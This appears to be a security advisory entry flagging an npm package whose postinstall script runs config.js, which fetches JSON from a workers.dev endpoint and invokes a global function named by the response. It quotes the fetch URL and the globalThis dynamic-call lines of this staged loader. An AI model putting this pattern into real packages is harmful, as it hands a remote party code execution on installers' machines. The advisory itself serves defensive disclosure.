summary: postinstall fetches remote JSON and dynamically invokes attacker-named global function
details: The package declares a postinstall lifecycle script that runs dist/config.js, which performs `fetch('https://my-api.trade-api.workers.dev?id=1')` and passes the JSON response into `globalThis[data.success](data.id)`. Both the invoked function name and the argument are taken from the HTTP response, giving the remote Cloudflare Workers endpoint arbitrary function-invocation on the installer's Node process at `npm install` time. The destination is not the package's publisher domain, the fetched content is unpinned and mutable, and config.js also contains a preceding `globalThis[tag](text)` call with no local definitions of the identifiers, consistent with a staged loader pattern.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
